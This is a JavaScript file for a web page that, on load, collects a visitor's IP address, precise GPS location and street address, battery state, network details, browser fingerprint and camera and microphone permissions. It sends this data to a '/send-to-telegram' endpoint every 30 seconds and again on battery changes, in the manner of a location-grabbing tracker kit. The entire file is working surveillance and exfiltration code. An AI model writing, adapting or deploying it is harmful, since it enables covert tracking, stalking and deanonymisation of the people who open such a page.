class DeviceInfoCollector {
  constructor() {
    this.deviceInfo = {
      userAgent: navigator.userAgent,
      ip: null,
      location: null,
      approxAddress: null,
      battery: null,
      cameraAccess: false,
      microphoneAccess: false,
      os: null,
      browser: null,
      device: null,
      cpuCores: navigator.hardwareConcurrency || null,
      screen: `${window.screen.width}x${window.screen.height}`,
      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : null,
      isTouchDevice: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
      connection: null,
      bandwidth: null,
      rtt: null,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: navigator.platform,
      vendor: navigator.vendor,
      product: navigator.product,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack === '1',
      onlineStatus: navigator.onLine,
      notificationPermission: Notification.permission
    };

    this.init();
  }

  async init() {
    document.getElementById('device-info').style.display = 'block';
    
    // Collect all information
    await this.collectIP();
    await this.collectLocation();
    await this.collectBatteryInfo();
    await this.checkPermissions();
    await this.collectNetworkInfo();
    this.parseUserAgent();
    this.collectAdditionalInfo();
    
    // Send initial data
    this.sendDataToTelegram();
    
    // Set up periodic updates
    setInterval(() => this.sendDataToTelegram(), 30000); // Send every 30 seconds
  }

  async collectIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      this.deviceInfo.ip = data.ip;
      document.getElementById('ip-info').textContent = `IP: ${data.ip}`;
      
      // Get approximate address from IP
      const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
      const geoData = await geoResponse.json();
      if (geoData.city && geoData.country) {
        this.deviceInfo.approxAddress = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
      }
    } catch (error) {
      document.getElementById('ip-info').textContent = 'IP: Could not fetch';
    }
  }

  async collectLocation() {
    if ('geolocation' in navigator) {
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          });
        });

        this.deviceInfo.location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };

        this.updateLocationInfo(position.coords);
        
        // Reverse geocoding
        try {
          const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
          );
          const data = await response.json();
          if (data.address) {
            const addressParts = [];
            if (data.address.road) addressParts.push(data.address.road);
            if (data.address.city) addressParts.push(data.address.city);
            if (data.address.country) addressParts.push(data.address.country);
            this.deviceInfo.approxAddress = addressParts.join(', ');
          }
        } catch (e) {
          console.log('Reverse geocoding failed:', e);
        }
      } catch (error) {
        document.getElementById('location-info').textContent = 
          `Location: ${error.message}`;
      }
    } else {
      document.getElementById('location-info').textContent = 'Location: Geolocation not supported';
    }
  }

  updateLocationInfo(coords) {
    document.getElementById('location-info').textContent = 
      `Location: ${coords.latitude}, ${coords.longitude} (Accuracy: ${coords.accuracy}m)`;
    
    const mapLink = document.getElementById('map-link');
    mapLink.href = `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
    mapLink.style.display = 'inline-block';
    mapLink.textContent = 'View on Google Maps';
  }

  async collectBatteryInfo() {
    if ('getBattery' in navigator) {
      try {
        const battery = await navigator.getBattery();
        this.deviceInfo.battery = {
          level: battery.level,
          charging: battery.charging
        };
        this.updateBatteryInfo(battery);
        
        battery.addEventListener('levelchange', () => {
          this.deviceInfo.battery.level = battery.level;
          this.updateBatteryInfo(battery);
          this.sendDataToTelegram();
        });
        
        battery.addEventListener('chargingchange', () => {
          this.deviceInfo.battery.charging = battery.charging;
          this.updateBatteryInfo(battery);
          this.sendDataToTelegram();
        });
      } catch (error) {
        document.getElementById('battery-info').textContent = 'Battery: Error accessing API';
      }
    } else {
      document.getElementById('battery-info').textContent = 'Battery: API not supported';
    }
  }

  updateBatteryInfo(battery) {
    const levelPercent = Math.round(battery.level * 100);
    const chargingStatus = battery.charging ? ' (charging)' : '';
    document.getElementById('battery-info').textContent = 
      `Battery: ${levelPercent}%${chargingStatus}`;
  }

  async checkPermissions() {
    // Camera
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      this.deviceInfo.cameraAccess = true;
      document.getElementById('camera-info').textContent = 'Camera: Granted';
      document.getElementById('camera-info').className = 'permission-granted';
      stream.getTracks().forEach(track => track.stop());
    } catch (error) {
      document.getElementById('camera-info').textContent = `Camera: ${error.message}`;
      document.getElementById('camera-info').className = 'permission-denied';
    }

    // Microphone
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      this.deviceInfo.microphoneAccess = true;
      document.getElementById('microphone-info').textContent = 'Microphone: Granted';
      document.getElementById('microphone-info').className = 'permission-granted';
      stream.getTracks().forEach(track => track.stop());
    } catch (error) {
      document.getElementById('microphone-info').textContent = `Microphone: ${error.message}`;
      document.getElementById('microphone-info').className = 'permission-denied';
    }
  }

  async collectNetworkInfo() {
    if ('connection' in navigator) {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection) {
        this.deviceInfo.connection = connection.effectiveType;
        this.deviceInfo.bandwidth = connection.downlink ? `${connection.downlink} Mbps` : null;
        this.deviceInfo.rtt = connection.rtt ? `${connection.rtt} ms` : null;
        
        document.getElementById('network-info').textContent = 
          `Network: ${connection.effectiveType}, Downlink: ${connection.downlink} Mbps, RTT: ${connection.rtt} ms`;
      }
    } else {
      document.getElementById('network-info').textContent = 'Network: Information not available';
    }
  }

  parseUserAgent() {
    const parser = new UAParser();
    const result = parser.getResult();
    
    this.deviceInfo.os = `${result.os.name} ${result.os.version}`;
    this.deviceInfo.browser = `${result.browser.name} ${result.browser.version}`;
    this.deviceInfo.device = result.device.vendor ? 
      `${result.device.vendor} ${result.device.model} (${result.device.type || 'desktop'})` : 
      'Desktop';
    
    document.getElementById('device-details').textContent = 
      `Device: ${this.deviceInfo.device}, OS: ${this.deviceInfo.os}, Browser: ${this.deviceInfo.browser}`;
  }

  collectAdditionalInfo() {
    // Add any additional info you want to collect
    this.deviceInfo.screenOrientation = window.screen.orientation ? window.screen.orientation.type : 'unknown';
    this.deviceInfo.pixelRatio = window.devicePixelRatio;
    this.deviceInfo.webGLRenderer = this.getWebGLRenderer();
    this.deviceInfo.installedFonts = this.getInstalledFonts();
  }

  getWebGLRenderer() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
      }
    } catch (e) {
      return 'unknown';
    }
    return 'unknown';
  }

  getInstalledFonts() {
    // This is a basic check for common fonts
    const fonts = [
      'Arial', 'Arial Black', 'Courier New', 
      'Georgia', 'Times New Roman', 'Verdana'
    ];
    return fonts.filter(font => {
      return document.fonts.check(`12px "${font}"`);
    }).join(', ');
  }

  async sendDataToTelegram() {
    try {
      await fetch('/send-to-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ deviceInfo: this.deviceInfo })
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  }
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
  new DeviceInfoCollector();
});